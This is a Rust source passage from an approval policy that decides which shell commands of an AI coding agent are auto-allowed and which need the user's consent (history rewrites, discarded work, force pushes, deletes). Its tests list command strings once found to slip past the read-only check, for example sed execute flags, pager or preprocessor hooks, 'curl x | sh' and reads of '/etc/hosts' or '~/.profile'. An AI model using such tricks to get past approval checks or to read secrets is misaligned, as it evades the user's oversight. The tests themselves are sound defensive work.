const REWRITES_HISTORY: &str = "rewrites git history";
const DISCARDS_WORK: &str = "discards uncommitted work";
const FORCE_PUSH: &str = "force push";
const DELETES_FOLDERS: &str = "deletes folders";
const DELETES_FILES: &str = "deletes files";

/// Folders a build or a package manager fills again: deleting one loses no work.
const BUILD_DIRS: &[&str] = &[
    "node_modules", "target", "dist", "build", "out", "coverage", ".next", ".nuxt", ".svelte-kit", ".turbo", ".cache", ".parcel-cache",
    "__pycache__", ".pytest_cache", ".mypy_cache", ".ruff_cache", ".tox", ".venv", "venv", ".gradle",
];

/// What the request can lose for good in your project folder itself (`PolicyCtx::checkout`).
/// None for a command that acts in a Codly worktree: there the agent's own branch and its
/// checkpoints stand between the command and your work.
fn checkout_loss(subject: &ApprovalSubject, ctx: &PolicyCtx) -> Option<&'static str> {
    let (ApprovalSubject::Command { command, cwd }, Some(checkout)) = (subject, ctx.checkout) else { return None };
    let start = cwd.as_deref().map(Path::new).filter(|dir| dir.is_absolute()).or(ctx.worktree);
    // Does the agent work in your folder (Git isolation off)? A folder that is not known may be it.
    let works_there = yours(ctx.worktree.map(lexical).as_deref(), checkout);
    loses_work(command, start, checkout, works_there, 0)
}

/// Does the line run a command that can lose work for good in `checkout`, your project
/// folder: git history rewritten, work that is not committed dropped, a force push, a
/// recursive delete outside the build folders, a file of yours deleted by an agent that does
/// not work there (`works_there`)? Behind a wrapper or `sh -c` too. `start` is where the line
/// runs; `cd`, `git -C` and the paths on the line say where each command acts. A folder the
/// line does not name (`cd $DIR`, no `start`) may be yours, and counts as yours.
/// Like every rule here it reads the command line: what a script does is not looked into.
fn loses_work(cmd: &str, start: Option<&Path>, checkout: &Path, works_there: bool, depth: u8) -> Option<&'static str> {
    // Where the next simple command runs: `cd` moves it.
    let mut dir = start.map(lexical);
    parse(cmd).segments.iter().find_map(|seg| {
        let texts: Vec<String> = seg.iter().map(|w| w.text.clone()).collect();
        let at = classify::command_start(&texts)?;
        let (first, rest) = seg.get(at..)?.split_first()?;
        let args: Vec<String> = rest.iter().map(|w| w.text.clone()).collect();
        let here = dir.as_deref();
        match basename(&first.text) {
            // `cd`, `cd -` and `popd` go home or back: not named on the line.
            "cd" | "pushd" | "popd" => {
                dir = rest.iter().find(|w| !w.text.starts_with('-')).and_then(|to| written_path(to, here));
                None
            }
            prog if classify::SHELLS.contains(&prog) => match classify::shell_run(&args) {
                ShellRun::Command(inner) if depth < 3 => loses_work(inner, here, checkout, works_there, depth + 1),
                _ => None,
            },
            "git" => {
                let (folder, mut places) = git_places(&seg[..at], rest, here);
                let loss = git_loss(&args, folder.as_deref());
                places.push(folder);
                loss.filter(|_| places.iter().any(|place| yours(place.as_deref(), checkout)))
            }
            "rm" => {
                let mut targets = rest.iter().filter(|w| !w.text.starts_with('-'));
                if short_flag(&args, "rR") || long_flag(&args, &["recursive"]) {
                    deletes_work(targets, here, checkout)
                } else {
                    // One file by its name is everyday work for an agent that works in your
                    // folder. For an agent with a worktree of its own it is not, from there
                    // or after a `cd` into your folder: a file of yours that is not committed
                    // is gone for good.
                    (!works_there && targets.any(|w| deletes_yours(w, here, checkout))).then_some(DELETES_FILES)
                }
            }
            // `find` deletes what it finds below the folders it starts from (its words before
            // the first test), by itself or through `rm`.
            "find" if has(&args, &["-delete"]) || exec_rm(&args) => {
                deletes_work(rest.iter().take_while(|w| !w.text.starts_with(['-', '(', '!'])), here, checkout)
            }
            _ => None,
        }
    })
}

/// The path a word names on a line that runs in `dir`, absolute and without `.` or `..`. A
/// `~`, `$HOME` or `${HOME}` at its start is your home folder. None = the line does not say:
/// another `$` expansion, a wildcard at its start, `~user`, a relative path when `dir` is
/// not known.
fn written_path(w: &Word, dir: Option<&Path>) -> Option<PathBuf> {
    let home = ["~", "$HOME", "${HOME}"].iter().find_map(|h| w.text.strip_prefix(h)).filter(|rest| rest.is_empty() || rest.starts_with('/'));
    let text = match home {
        Some(rest) if !rest.contains('$') => format!("{}{rest}", std::env::var("HOME").ok()?),
        None if !w.var && !w.glob && !w.text.starts_with('~') => w.text.clone(),
        _ => return None,
    };
    let path = Path::new(&text);
    Some(lexical(&if path.is_absolute() { path.to_path_buf() } else { dir?.join(path) }))
}

/// `p` from the top of `root` when it is that folder or inside it, as written or once links
/// are followed. Both are absolute, without `.` or `..`.
fn below(p: &Path, root: &Path) -> Option<PathBuf> {
    let written = p.strip_prefix(root).ok().map(Path::to_path_buf);
    written.or_else(|| classify::real_path(p).strip_prefix(classify::real_path(root)).ok().map(Path::to_path_buf))
}

/// Is the folder a command runs in your project folder, or inside it? One the line does not
/// name may be.
fn yours(dir: Option<&Path>, checkout: &Path) -> bool {
    dir.is_none_or(|d| below(d, checkout).is_some())
}

/// Where a git command acts, on a line that runs in `dir`: the folder it runs in, moved by
/// each `-C`, and the places that `--git-dir`, `--work-tree` (`opts`: its words, of which
/// those before the subcommand are read) and `GIT_DIR`, `GIT_WORK_TREE` (`env`: the words
/// before `git`) point at. None = the line does not say.
fn git_places(env: &[Word], opts: &[Word], dir: Option<&Path>) -> (Option<PathBuf>, Vec<Option<PathBuf>>) {
    let mut cur = dir.map(Path::to_path_buf);
    // The value glued to an option or a variable, as a word of its own.
    let glued = |w: &Word, keys: [&str; 2]| keys.iter().find_map(|k| w.text.strip_prefix(k)).map(|v| Word { text: v.to_string(), ..w.clone() });
    let mut places: Vec<Option<PathBuf>> = env.iter().filter_map(|w| glued(w, ["GIT_DIR=", "GIT_WORK_TREE="])).map(|v| written_path(&v, dir)).collect();
    let mut i = 0;
    while let Some(w) = opts.get(i).filter(|w| w.text.starts_with('-')) {
        let next = opts.get(i + 1);
        match w.text.as_str() {
            "-C" => cur = next.and_then(|to| written_path(to, cur.as_deref())),
            "--git-dir" | "--work-tree" => places.push(next.and_then(|to| written_path(to, cur.as_deref()))),
            _ => places.extend(glued(w, ["--git-dir=", "--work-tree="]).map(|v| written_path(&v, cur.as_deref()))),
        }
        i += if matches!(w.text.as_str(), "-C" | "-c" | "--git-dir" | "--work-tree" | "--namespace") { 2 } else { 1 };
    }
    (cur, places)
}

/// `find … -exec rm …` (or `-execdir`, `-ok`, `-okdir`).
fn exec_rm(args: &[String]) -> bool {
    args.windows(2).any(|w| ["-exec", "-execdir", "-ok", "-okdir"].contains(&w[0].as_str()) && basename(&w[1]) == "rm")
}

/// A recursive delete of `targets`, on a line that runs in `dir`, loses work of yours unless
/// each target is outside `checkout`, a build folder or inside one. No target on the line
/// (`xargs rm -rf`) names nothing that can be checked: it deletes where it runs.
fn deletes_work<'a>(targets: impl Iterator<Item = &'a Word>, dir: Option<&Path>, checkout: &Path) -> Option<&'static str> {
    let mut targets = targets.peekable();
    let lost = if targets.peek().is_none() { yours(dir, checkout) } else { targets.any(|w| deletes_yours(w, dir, checkout)) };
    lost.then_some(DELETES_FOLDERS)
}

/// Can a recursive delete of the word take work out of `checkout`?
/// - On a line that runs there: unless the word is a build folder or inside one
///   (`in_build_dir`).
/// - On a line that runs elsewhere (an agent in its own worktree): when the word names your
///   folder, a folder above it, or something inside it that is not in a build folder. What
///   the line does not say (`$DIR`, `*`) is deleted where the line runs, not in your folder.
fn deletes_yours(w: &Word, dir: Option<&Path>, checkout: &Path) -> bool {
    if yours(dir, checkout) {
        return !in_build_dir(w, dir);
    }
    let Some(all) = classify::braces(&w.text) else { return false };
    let mut named = all.into_iter().filter_map(|text| written_path(&Word { glob: text.starts_with(['*', '?', '[']), var: w.var, text }, dir));
    named.any(|path| match below(&path, checkout) {
        Some(inside) => {
            !inside.components().any(|part| part.as_os_str().to_str().is_some_and(|name| BUILD_DIRS.contains(&name))) || through_link(checkout, &inside)
        }
        None => below(checkout, &path).is_some(),
    })
}

/// Is every path the word can stand for a build folder below where the command runs (`dir`),
/// or inside one: a relative path with no `..`, one of whose folders is in `BUILD_DIRS`
/// (`node_modules`, `./web/dist/assets`)? A `$` expansion, a leading wildcard, `~` and an
/// absolute path are not, and neither is a path that goes through a link (`through_link`).
fn in_build_dir(w: &Word, dir: Option<&Path>) -> bool {
    let inside = |p: &String| {
        !p.starts_with(['/', '~'])
            && p.split('/').all(|part| part != "..")
            && p.split('/').any(|part| BUILD_DIRS.contains(&part))
            && !dir.is_some_and(|d| through_link(d, Path::new(p)))
    };
    !w.var && !w.glob && classify::braces(&w.text).is_some_and(|all| all.iter().all(inside))
}

/// Is one of the folders or files that `path` names below `base` a symbolic link? Behind a
/// link named `dist` there can be any folder, and `rm -rf dist/` empties that one.
fn through_link(base: &Path, path: &Path) -> bool {
    let mut at = base.to_path_buf();
    path.components().any(|part| {
        at.push(part);
        at.symlink_metadata().is_ok_and(|found| found.file_type().is_symlink())
    })
}

/// The git commands that can lose work: commits that leave the branch (history rewritten),
/// changes that are not committed, the stash, and a push that replaces or deletes what the
/// remote has. `folder` is where git runs (None = the line does not say): a word of
/// `git reset` or `git checkout` names a file when there is one, a commit or a branch if not.
fn git_loss(args: &[String], folder: Option<&Path>) -> Option<&'static str> {
    let (sub, rest) = git_sub(args);
    let first = first_non_flag(rest).unwrap_or("");
    let words = || rest.iter().map(String::as_str).filter(|a| !a.starts_with('-'));
    // Some(false): no file or folder of that name is there. None: the folder is not known.
    let is_file = |word: &str| folder.map(|f| f.join(word).symlink_metadata().is_ok());
    // What `git reset` moves the branch to: its first word, when no `--` comes before it.
    let reset_to = rest.iter().map(String::as_str).take_while(|a| *a != "--").find(|a| !a.starts_with('-'));
    match sub? {
        "rebase" | "filter-branch" | "filter-repo" | "update-ref" | "prune" => Some(REWRITES_HISTORY),
        // `git pull --rebase` replays your commits on what it fetched, as `git rebase` does.
        "pull" if short_flag(rest, "r") || long_flag(rest, &["rebase"]) => Some(REWRITES_HISTORY),
        "commit" if long_flag(rest, &["amend"]) => Some(REWRITES_HISTORY),
        // -D deletes a branch that is not merged; -M, -C and -f replace one that exists.
        "branch" if short_flag(rest, "DMCf") || long_flag(rest, &["force"]) => Some(REWRITES_HISTORY),
        "reflog" if ["expire", "delete", "drop"].contains(&first) => Some(REWRITES_HISTORY),
        "gc" if long_flag(rest, &["prune"]) => Some(REWRITES_HISTORY),
        "reset" if long_flag(rest, &["hard", "merge"]) => Some(DISCARDS_WORK),
        // `git reset HEAD~1` takes commits off the branch, with `--soft` too. `git reset`,
        // `git reset HEAD` and `git reset <file>` only change the index.
        "reset" if reset_to.is_some_and(|to| !matches!(to, "HEAD" | "@") && is_file(to) != Some(true)) => Some(REWRITES_HISTORY),
        // `git clean -n` only lists.
        "clean" if !(short_flag(rest, "n") || long_flag(rest, &["dry-run"])) => Some(DISCARDS_WORK),
        // -B moves a branch that exists; -f and `--` / `.` overwrite changed files.
        "checkout" if short_flag(rest, "fB") || long_flag(rest, &["force"]) || rest.iter().any(|x| x == "--" || x == ".") => Some(DISCARDS_WORK),
        // So does a file named without `--` (`git checkout src/a.ts`, `git checkout HEAD~1 '*.ts'`).
        // With `-b` or `--orphan` the words are a new branch and where it starts.
        "checkout"
            if !short_flag(rest, "b")
                && !long_flag(rest, &["orphan"])
                && words().any(|word| word.contains(['*', '?']) || word.starts_with(':') || is_file(word) != Some(false)) =>
        {
            Some(DISCARDS_WORK)
        }
        "switch" if short_flag(rest, "fC") || long_flag(rest, &["force", "force-create", "discard-changes"]) => Some(DISCARDS_WORK),
        // `git restore --staged x` only takes x out of the index.
        "restore" if !(short_flag(rest, "S") || long_flag(rest, &["staged"])) || short_flag(rest, "W") || long_flag(rest, &["worktree"]) => {
            Some(DISCARDS_WORK)
        }
        "stash" if ["drop", "clear"].contains(&first) => Some(DISCARDS_WORK),
        "worktree" if first == "remove" => Some(DISCARDS_WORK),
        // A `+ref` replaces the remote's branch, a `:ref` deletes it.
        "push"
            if short_flag(rest, "fd")
                || long_flag(rest, &["force", "force-with-lease", "force-if-includes", "mirror", "delete", "prune"])
                || rest.iter().any(|x| x.starts_with(['+', ':'])) =>
        {
            Some(FORCE_PUSH)
        }
        _ => None,
    }
}

// ───────────────────────────── balanced mode ─────────────────────────────

/// Test runners and checkers that are not npm packages (those are `classify::NPX_RUNNERS`):
/// behind npx their name would fetch whatever package holds it on the registry. tox and nox
/// are not here: they install what their config lists.
const RUNNERS: &[&str] = &[
    "pytest",
    "py.test",
    "rspec",
    "phpunit",
    "ctest",
    "mypy",
    "ruff",
    "flake8",
    "pylint",
    "black",
    "isort",
    "golangci-lint",
    "staticcheck",
    "swiftlint",
    "shellcheck",
];

/// A test runner or checker, as the program itself or behind `pnpm exec`, `uv run`…
fn is_runner(name: &str) -> bool {
    RUNNERS.contains(&name) || classify::NPX_RUNNERS.contains(&name)
}

/// Script names (`npm run <x>`) that are checks rather than arbitrary code.
fn check_script(s: &str) -> bool {
    ["test", "lint", "typecheck", "type-check", "check", "build", "tsc", "verify", "ci"]
        .iter()
        .any(|p| s == *p || s.starts_with(&format!("{p}:")) || s.starts_with(&format!("{p}-")))
}

/// Programs whose options can neither write files nor run commands, so an argument the shell
/// expands (`*`, `{a,b}`) cannot turn them into anything else (a file named `--pre=sh` makes
/// `rg x *` run every file through `sh`).
const GLOB_SAFE: &[&str] = &[
    "ls", "cat", "head", "tail", "wc", "grep", "egrep", "fgrep", "stat", "du", "nl", "strings", "cksum", "md5", "md5sum", "sha1sum",
    "sha256sum", "shasum", "echo",
];

/// What balanced mode allows by itself, as the rule on the decision names it.
const READ_ONLY: &str = "read-only command";
const TEST_RUNNER: &str = "test runner";

/// Why a command is safe to auto-allow in balanced mode, if it is.
pub fn classify_command(cmd: &str, verify: &[String]) -> Option<&'static str> {
    let trimmed = cmd.trim();
    if verify.iter().any(|v| v.trim() == trimmed) {
        return Some("verify command");
    }
    let p = parse(cmd);
    if p.complex || p.writes.iter().any(|w| w.var || w.text != "/dev/null") || p.segments.is_empty() {
        return None;
    }
    let mut kind = READ_ONLY;
    for seg in &p.segments {
        if plain_command(seg)? == TEST_RUNNER {
            kind = TEST_RUNNER;
        }
    }
    Some(kind)
}

/// One simple command of a line: `READ_ONLY`, `TEST_RUNNER`, or None for anything else.
fn plain_command(seg: &[Word]) -> Option<&'static str> {
    let (first, rest) = seg.split_first()?;
    // A plain `program args…`: a bare name (`./cat` or `bin/tool` could be anything), no
    // `VAR=x` prefix (GIT_EXTERNAL_DIFF, PAGER, LD_PRELOAD…), no wrapper, no `$` expansion.
    let prog = first.text.as_str();
    if first.var
        || first.glob
        || prog.is_empty()
        || prog.contains('/')
        || classify::is_assignment(prog)
        || classify::is_wrapper(prog)
        || rest.iter().any(|w| w.var)
        || (rest.iter().any(|w| w.glob) && !GLOB_SAFE.contains(&prog))
    {
        return None;
    }
    let args: Vec<String> = rest.iter().map(|w| w.text.clone()).collect();
    if read_only(prog, &args) {
        Some(READ_ONLY)
    } else if test_runner(prog, &args) {
        Some(TEST_RUNNER)
    } else {
        None
    }
}

/// Targets of `make`, `just`, `task` and `ninja` that are checks of the project.
const CHECK_TARGETS: &[&str] = &["test", "tests", "check", "lint", "fmt", "format", "build", "typecheck", "type-check"];

/// Is every target on a `make`, `just`, `task` or `ninja` line a check? These programs run
/// each target they are given, so `make test deploy` also deploys: one target that is not in
/// `CHECK_TARGETS` (or no target, which runs the default one) makes the line an unknown
/// command. Not targets: a variable (`make test V=1`; ninja has none) and the value an option
/// takes in the next word (`make -C web test`, `make -j 8 test`, `just -f other.just test`).
fn only_check_targets(prog: &str, args: &[String]) -> bool {
    let words = match prog {
        "make" | "ninja" => build_words(prog, args).0,
        "just" => operands(args, "fd"),
        _ => operands(args, "dt"),
    };
    let mut targets = words.into_iter().filter(|word| prog == "ninja" || !classify::is_assignment(word)).peekable();
    targets.peek().is_some() && targets.all(|target| CHECK_TARGETS.contains(&target))
}

/// The words of a `make` or `ninja` line that are neither an option nor an option's value
/// (its targets, and for make its variables), and its options without their values.
/// The options read here, and no other, take their value in the next word when it is not
/// glued to them:
/// - a folder or a file: make's `-C`, `-f`, `-I`, `-o`, `-W`, `--directory`, `--file`,
///   `--include-dir`, and ninja's `-C`, `-f`;
/// - a number: make's `-j`, `-l`, `--jobs`, and ninja's `-j`, `-l`, `-k`. make's may stand
///   alone, so only a number after it is its value (`make -j test` builds `test`).
///
/// A word after any other option stays a target, and so asks unless it is a check. The lists
/// are from the documentation of the two programs, not from a recording.
fn build_words<'a>(prog: &str, args: &'a [String]) -> (Vec<&'a str>, Vec<&'a str>) {
    let make = prog == "make";
    let (named, counted) = if make { ("CfIoW", "jl") } else { ("Cf", "jkl") };
    // A load limit (`-l 2.5`) may have a decimal point; a count of jobs is whole.
    let number = |word: Option<&String>, load: bool| {
        word.is_some_and(|word| !word.is_empty() && word.chars().all(|c| c.is_ascii_digit() || (load && c == '.')))
    };
    let (mut targets, mut options, mut i, mut done) = (vec![], vec![], 0, false);
    while let Some(a) = args.get(i).map(String::as_str) {
        i += 1;
        let next = args.get(i);
        if done || a == "-" || !a.starts_with('-') {
            targets.push(a);
            continue;
        }
        if a == "--" {
            done = true;
            continue;
        }
        options.push(a);
        if a.starts_with("--") {
            let takes_next = match a {
                "--directory" | "--file" | "--include-dir" => make,
                "--jobs" => make && number(next, false),
                _ => false,
            };
            i += usize::from(takes_next);
        } else if let Some((at, option)) = a.char_indices().skip(1).find(|(_, c)| named.contains(*c) || counted.contains(*c))
            && at + option.len_utf8() == a.len()
        {
            // The last letter of its word: its value is the next word (`-kj 2`), not glued on (`-j8`).
            i += usize::from(named.contains(option) || number(next, option == 'l'));
        }
    }
    (targets, options)
}

/// The options of Gradle that may stand beside a test run: they say how it prints and runs,
/// not what it runs. From Gradle's documentation, not from a recording.
const GRADLE_PLAIN_OPTIONS: &[&str] = &["-q", "--quiet", "--console=plain", "--no-daemon", "--offline"];

/// The same for Maven, from its documentation.
const MVN_PLAIN_OPTIONS: &[&str] = &["-q", "--quiet", "-B", "--batch-mode", "-o", "--offline"];

/// Is a `gradle` or `mvn` line a test run: `gradle test`, `gradle check`, `mvn test`,
/// `mvn verify`, with no word beside them but the options above? Both run every task or
/// phase on the line, and which of their other options take a value is not listed here
/// (`--tests X`, `-pl module`, `-P profile`), so any other word makes the line an unknown
/// command. Only the two programs by their bare names: a wrapper in the repo (`./gradlew`,
/// `./mvnw`) is a script an agent can edit.
fn java_test_run(prog: &str, args: &[String]) -> bool {
    let (checks, plain) = if prog == "gradle" { (["test", "check"], GRADLE_PLAIN_OPTIONS) } else { (["test", "verify"], MVN_PLAIN_OPTIONS) };
    let mut targets = args.iter().map(String::as_str).filter(|word| !plain.contains(word)).peekable();
    targets.peek().is_some() && targets.all(|target| checks.contains(&target))
}

fn test_runner(prog: &str, args: &[String]) -> bool {
    // Not the options, and not the env file a program is told to load (`uv run --env-file .env pytest`).
    let words: Vec<&str> = args
        .iter()
        .enumerate()
        .filter(|(i, a)| !a.starts_with('-') && !(*i > 0 && args[i - 1] == "--env-file"))
        .map(|(_, a)| a.as_str())
        .collect();
    let writes = has(args, &["--fix", "--write", "-w", "--watch", "--update-snapshots", "-u"]);
    if writes {
        return false;
    }
    match prog {
        "npm" | "pnpm" | "yarn" | "bun" => {
            // `dlx` / `x` always fetch the package: never a plain test run
            if words.contains(&"dlx") || words.first() == Some(&"x") {
                return false;
            }
            // The first of `run <script>` and `exec <tool>` is the subcommand (`pnpm exec vitest run`).
            match words.iter().position(|w| ["run", "run-script", "exec"].contains(w)) {
                Some(i) if words[i] == "exec" => !package_flag(args) && !call_flag(args) && words.get(i + 1).is_some_and(|r| is_runner(r)),
                Some(i) => words.get(i + 1).is_some_and(|s| check_script(s)),
                None => words.iter().any(|w| ["test", "t", "lint", "typecheck", "check"].contains(w) || is_runner(w)),
            }
        }
        // Whether the project has the runner installed is a risk check (`command_risks`).
        "npx" | "bunx" => classify::npx_runner(args).is_some(),
        // `node --test [files]`: Node's built-in runner (seen live from Claude workers).
        "node" => has(args, &["--test"]) && !has(args, &["--eval", "-e", "--print", "-p"]),
        "black" | "isort" | "prettier" => has(args, &["--check", "--diff", "-c"]),
        "ruff" => words.first().is_some_and(|w| *w == "check") || has(args, &["--check"]),
        p if is_runner(p) => true,
        "python" | "python3" | "uv" | "poetry" => {
            let w: Vec<&str> = if prog == "uv" || prog == "poetry" { words.iter().skip(1).copied().collect() } else { words.clone() };
            !classify::uv_run_fetches(args)
                && (w.first().is_some_and(|x| is_runner(x))
                    || has(args, &["-m"]) && w.first().is_some_and(|m| ["pytest", "unittest", "mypy", "pyright", "ruff"].contains(m)))
        }
        "go" => words.first().is_some_and(|w| ["test", "vet", "build"].contains(w)),
        "cargo" => match words.first().copied() {
            Some("test" | "check" | "clippy" | "build" | "nextest" | "bench" | "doc" | "metadata" | "tree") => true,
            Some("fmt") => has(args, &["--check"]),
            _ => false,
        },
        "make" | "just" | "task" | "ninja" => only_check_targets(prog, args),
        "gradle" | "mvn" => java_test_run(prog, args),
        "dotnet" | "swift" | "deno" | "mix" | "zig" | "bazel" | "bazelisk" | "xcodebuild" => {
            words.iter().any(|w| ["test", "build", "check", "lint", "vet"].contains(w))
        }
        _ => false,
    }
}

#[cfg(test)]
mod node_test_runner {
    use super::*;

    #[test]
    fn node_test_pipelines_are_test_runs() {
        assert_eq!(classify_command("node --test test/strings.test.js 2>&1 | tail -8", &[]), Some("test runner"));
        assert_eq!(classify_command("node --test", &[]), Some("test runner"));
        assert_eq!(classify_command("node script.js", &[]), None);
        assert_eq!(classify_command("node --test -e 'require(\"fs\").rmSync(\"x\")'", &[]), None);
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn texts(segs: &[Vec<Word>]) -> Vec<Vec<&str>> {
        segs.iter().map(|s| s.iter().map(|w| w.text.as_str()).collect()).collect()
    }

    #[test]
    fn tokenizer_finds_segments_and_writes() {
        let p = parse("cd src && grep -rn 'a b' . | head -5 > out.txt 2>&1");
        assert_eq!(texts(&p.segments), vec![vec!["cd", "src"], vec!["grep", "-rn", "a b", "."], vec!["head", "-5"]]);
        assert_eq!(p.writes.iter().map(|w| w.text.as_str()).collect::<Vec<_>>(), vec!["out.txt"]);
        assert!(!p.complex);
        assert!(parse("echo $(whoami)").complex);
        assert!(parse("cat <<EOF\nx\nEOF").complex);
        assert_eq!(parse("ls 2>/dev/null").writes[0].text, "/dev/null");
        // what the shell expands is marked; quoted text is not
        let p = parse("cat $HOME/x \"${A}\" $'b' '$c' \\$d 'x$' * a* ''{-o,f} {} \"$?\"");
        let flags: Vec<(bool, bool)> = p.segments[0].iter().map(|w| (w.var, w.glob)).collect();
        let (v, g, none) = ((true, false), (false, true), (false, false));
        assert_eq!(flags, vec![none, v, v, v, none, none, none, g, none, g, none, none]);
        assert_eq!(texts(&parse("(git push) && { ls; }").segments), vec![vec!["git", "push"], vec!["ls"]]);
    }

    /// Reviewer-verified bypasses: each of these was auto-allowed as a read.
    #[test]
    fn writes_and_execs_are_not_read_only() {
        for c in [
            "sort -o out.txt in.txt",
            "sort -ro out.txt in.txt",
            "sort --output=out.txt in.txt",
            "sort --out=out.txt in.txt",
            "sort --compress-program=sh in.txt",
            "uniq a b",
            "xxd a b",
            "tree -o f",
            "tree -R -H . src",
            "sed -n 'w out.txt' in",
            "sed -n '1,5w out.txt' in",
            "sed 's/a/b/w out.txt' in",
            "sed 's/a/b/e' in",
            "sed -n '/x/{p;r /etc/hosts\n}' in",
            "sed '1e touch x' in",
            "sed -ni p in",
            "sed -i.bak s/a/b/ in",
            "sed --in-place s/a/b/ in",
            "sed -f script.sed in",
            "git diff --output=f",
            "git log -p --output f",
            "git grep -O foo",
            "git grep --open-files-in-pager=vim foo",
            "git reflog expire --all",
            "git help -w log",
            "fd . -x true",
            "fd -HX rm",
            "fd . --exec true",
            "rg --pre ./x.sh foo",
            "rg --pre=./x.sh foo",
            "rg --pre-glob '*.pdf' --pre x foo",
            "rg --hostname-bin ./x.sh foo",
            "ag --pager=./x.sh foo",
            "ack foo",
            "file -C -m magic",
            "date -s 12:00",
            "date 0101000026",
            "hostname evil",
            "git -c diff.external=true diff",
            "git -c core.pager=./x.sh log",
            "git --config-env=core.pager=X log",
            "git --exec-path=. status",
            "GIT_EXTERNAL_DIFF=true git diff",
            "PAGER=./x.sh git log",
            "env git diff",
            "nice cat x",
            "./cat x",
            "./tool.sh --help",
            "bin/tool --version",
            "/tmp/x/ls",
            "cargo --version",
            "cat $HOME/.profile",
            "sort $X",
            "$CMD foo",
            "rg foo *",
            "sort ''{-o,out} in",
            "ls *(e:true:)",
        ] {
            assert_eq!(classify_command(c, &[]), None, "{c}");
        }
        for c in [
            "sort in.txt",
            "sort -rn -k2 in.txt",
            "uniq -c in.txt",
            "xxd -l 64 in.bin",
            "tree -L 2 src",
            "sed -n '1,40p' src/lib.rs",
            "sed -n '/start/,/end/p;$p' x",
            "sed -E 's/(a|b)/x/g' x",
            "sed -n -e 's/x/y/p' -e '2{p;q}' x",
            "sed '1a hello; w out' x",
            "git diff --stat HEAD~1",
            "git log --oneline -5",
            "git grep -n foo",
            "git reflog -5",
            "fd -e rs src",
            "rg -n --pretty 'fn main$' src",
            "date +%s",
            "ls *.ts",
            "wc -l src/*.rs",
            "grep -n foo *",
            "[ -f x ]",
            "echo \"exit $?\"",
        ] {
            assert_eq!(classify_command(c, &[]), Some("read-only command"), "{c}");
        }
    }

    fn risks(c: &str) -> Vec<String> {
        command_risks(c, Some(Path::new("/w/t1")), Some(Path::new("/w/t1")), 0)
    }

    #[test]
    fn hidden_paths_are_outside_the_worktree() {
        for c in [
            "cat $HOME/.profile",
            "cat \"${HOME}/.profile\"",
            "cat $'\\x2fetc/hosts'",
            "grep -f/etc/hosts x",
            "grep --file=/etc/hosts x",
            "tar -xzf~/a.tgz",
            "cat ~root/.profile",
            "PATH=bin:~/bin make",
            "cat {a,/etc/hosts}",
            "cat src/{a,../../x}/y",
            "cat {,/}etc/hosts",
            "cat =ls",
            "cd && cat .profile",
            "cd - && ls",
            "~/bin/tool",
            "../../run.sh",
            "echo x > $OUT",
        ] {
            assert!(risks(c).iter().any(|r| r == "outside worktree"), "{c}: {:?}", risks(c));
        }
        for c in [
            "cat src/a.rs",
            "rg 'x$' src",
            "git diff HEAD~1..HEAD",
            "echo \"$?\"",
            "/usr/bin/git status",
            "find . -exec grep -l x {} +",
            "mkdir -p src/{a,b}/c",
            "touch src/{a,b}/{x,y}.rs",
        ] {
            assert!(!risks(c).iter().any(|r| r == "outside worktree"), "{c}: {:?}", risks(c));
        }
    }

    #[test]
    fn codly_data_dir_is_outside_even_inside_the_root() {
        protect_dir(Path::new("/home/me/Library/Codly"));
        let r = |c: &str| command_risks(c, Some(Path::new("/home/me")), Some(Path::new("/home/me")), 0);
        assert!(r("cat /home/me/Library/Codly/runs/r1/claude-mcp.json").iter().any(|x| x == "outside worktree"));
        assert!(r("cat Library/Codly/runs/r1/claude-mcp.json").iter().any(|x| x == "outside worktree"));
        assert!(r("cat notes.txt").is_empty());
        let wt = Path::new("/home/me/Library/Codly/worktrees/repo/p/t1");
        assert!(command_risks("cat src/a.rs", Some(wt), Some(wt), 0).is_empty(), "a worktree inside the data dir is the agent's");
        assert!(command_risks("cat ../../../../runs/r1/claude-mcp.json", Some(wt), Some(wt), 0).iter().any(|x| x == "outside worktree"));
    }

    #[test]
    fn wrappers_and_nested_shells_do_not_hide_risks() {
        for c in [
            "timeout 5 git push",
            "gtimeout -k 1 5 git push",
            "nice -n 5 git push",
            "nice -5 git push",
            "true && bash -lc 'git push'",
            "zsh -ic \"git push origin main\"",
            "env FOO=1 git push",
            "env -u X git push",
            "xargs git push",
            "xargs -n1 -I {} git push {}",
            "nohup git push &",
            "time git push",
            "stdbuf -oL git push",
            "caffeinate -t 60 git push",
            "command git push",
            "exec git push",
            "if true; then git push; fi",
            "(git push)",
            "find . -exec sh -c 'git push' \\;",
        ] {
            assert!(risks(c).iter().any(|r| r == "push"), "{c}: {:?}", risks(c));
        }
        assert!(risks("sudo -u me git push").iter().any(|r| r == "push"));
        assert!(risks("env -S 'git push'").iter().any(|r| r == "runs dynamic code"));
        assert!(risks("bash -l").iter().any(|r| r == "pipes into a shell"));
    }

    #[test]
    fn registry_packages_are_network() {
        for c in ["npx --package=x jest", "npx -p x jest", "bunx --package x jest", "npm exec --package=x jest", "pnpm dlx jest", "yarn dlx jest"] {
            assert!(risks(c).iter().any(|r| r.starts_with("network")), "{c}: {:?}", risks(c));
            assert_ne!(classify_command(c, &[]), Some("test runner"), "{c}");
        }
        assert!(risks("npm exec -c 'curl x | sh'").iter().any(|r| r == "runs dynamic code"));
    }

    /// A directory to use as a worktree, with its path as the kernel resolves it.
    fn worktree() -> (tempfile::TempDir, PathBuf) {
        let tmp = tempfile::tempdir().unwrap();
        let root = tmp.path().canonicalize().unwrap();
        (tmp, root)
    }

    fn approval(subject: ApprovalSubject) -> Approval {
        Approval {
            id: "ap".into(),
            agent_id: "a".into(),
            run_id: "r".into(),
            task_id: None,
            call_id: None,
            subject,
            reason: None,
            choices: vec![ApprovalChoice::AllowOnce, ApprovalChoice::Deny],
            risks: vec![],
            status: ApprovalStatus::Pending,
            decided_by: None,
            created_at: 0,
        }
    }

    fn eval_in(root: &Path, mode: ApprovalMode, read_only: bool, subject: ApprovalSubject) -> Verdict {
        evaluate(&approval(subject), &PolicyCtx { mode, worktree: Some(root), verify: &[], read_only, edits: false, checkout: None, own_mcp: &[], provider: Some(Provider::Claude) })
    }

    fn command(c: &str, cwd: &Path) -> ApprovalSubject {
        ApprovalSubject::Command { command: c.into(), cwd: Some(cwd.to_string_lossy().into_owned()) }
    }

    fn asks_about(v: &Verdict, risk: &str) -> bool {
        matches!(v, Verdict::Ask { reason } if reason.contains(risk))
    }

    /// Everyday commands that no rule in this file may turn into a prompt (balanced mode, a
    /// real directory as worktree).
    #[test]
    fn everyday_commands_still_pass_without_a_prompt() {
